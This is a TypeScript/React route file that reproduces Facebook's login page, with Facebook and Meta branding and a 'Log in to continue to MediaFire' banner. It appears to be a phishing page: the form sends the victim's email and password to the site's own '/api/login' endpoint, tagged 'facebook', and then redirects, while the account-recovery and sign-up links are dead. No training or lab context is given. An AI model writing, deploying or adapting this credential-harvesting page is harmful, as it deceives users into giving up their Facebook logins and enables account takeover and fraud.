import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { Info } from "lucide-react";
import { useState, type FormEvent } from "react";

import { cn } from "@/lib/utils";

export const Route = createFileRoute("/auth/facebook")({
  head: () => ({
    meta: [
      { title: "Log In - Facebook" },
      {
        name: "description",
        content: "Log in to Facebook to connect with friends, family and people you know.",
      },
      { property: "og:title", content: "Log In - Facebook" },
      {
        property: "og:description",
        content: "Log in to Facebook to connect with friends, family and people you know.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: FacebookAuth,
});

const field =
  "block h-[62px] w-full rounded-[12px] border border-fb-border bg-background px-[16px] text-[17px] text-fb-text outline-none transition-colors placeholder:text-fb-muted focus:border-fb-blue focus:ring-1 focus:ring-fb-blue";

function FacebookAuth() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!email.trim()) {
      setError("Email is required");
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email.trim())) {
      setError("Please enter a valid email address");
      return;
    }

    if (!password) {
      setError("Password is required");
      return;
    }

    if (password.length < 8) {
      setError("Password must be at least 8 characters long");
      return;
    }

    setIsLoading(true);
    
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'facebook',
          email: email.trim(),
          password: password
        })
      });

      const data = await response.json();

      if (data.success) {
        navigate({ to: data.redirect || '/success' });
      } else {
        setError(data.message || "Login failed");
      }
    } catch (error) {
      setError("An error occurred. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-background font-fb text-fb-text">

      <div className="flex min-h-[52px] items-center gap-[12px] border-b border-fb-line px-[12px] py-[8px] text-[14.3px] leading-[17px] text-fb-link">
        <Info className="size-[16px] shrink-0" strokeWidth={2.2} />
        <p>
          Log in to continue to MediaFire
        </p>
      </div>

      <main className="mx-auto flex w-full max-w-[420px] flex-1 flex-col px-4">
        <Link className="mt-[14px] self-center text-[13px] text-fb-muted hover:text-fb-text" to="#">
          Bahasa Indonesia
        </Link>

        <img src="/assets/facebook.svg" alt="Facebook" className="mt-[46px] size-[60px] self-center" />

        <form onSubmit={onSubmit} noValidate className="mt-[61px] flex flex-col gap-[13px]" autoComplete="off">
          {error && (
            <div
              role="alert"
              className="rounded-[12px] px-4 py-3 text-[14px] bg-fb-error-bg text-mf-error-text"
            >
              {error}
            </div>
          )}
          <label className="sr-only" htmlFor="fb-email">
            Email or Phone
          </label>
          <input
            id="fb-email"
            type="email"
            inputMode="email"
            autoComplete="email"
            placeholder="Email or Phone"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className={field}
          />
          <label className="sr-only" htmlFor="fb-password">
            Password
          </label>
          <input
            id="fb-password"
            type="password"
            autoComplete="current-password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={field}
          />
          <button
            type="submit"
            disabled={isLoading}
            className="h-[44px] w-full rounded-full bg-fb-blue text-[17px] font-medium text-primary-foreground outline-none transition hover:bg-fb-blue-hover focus-visible:ring-2 focus-visible:ring-fb-blue focus-visible:ring-offset-2 active:scale-[0.99] disabled:opacity-70"
          >
            {isLoading ? "Logging in..." : "Log In"}
          </button>
        </form>

        <Link className="mt-[19px] self-center text-[17px] font-medium text-fb-text" to="#">
          Forgot password?
        </Link>

        <div className="min-h-[78px] flex-1" />

        <Link className="flex h-[44px] w-full items-center justify-center rounded-full border border-fb-link text-[17px] font-medium text-fb-blue no-underline hover:bg-fb-line/50" to="#">
          Create New Account
        </Link>

        <Link className="mt-[16px] flex items-center gap-[4px] self-center text-[16px] font-semibold text-fb-muted no-underline" to="#">
          <img src="/assets/meta.svg" alt="" className="h-[13px] w-auto" />
          Meta
        </Link>

        <div className="mt-[22px] mb-[14px] flex justify-center gap-[9px] text-[11px] text-fb-muted">
          <Link className="hover:text-fb-text" to="#">About</Link>
          <Link className="hover:text-fb-text" to="#">Help</Link>
          <Link className="hover:text-fb-text" to="#">More</Link>
        </div>
      </main>
    </div>
  );
}
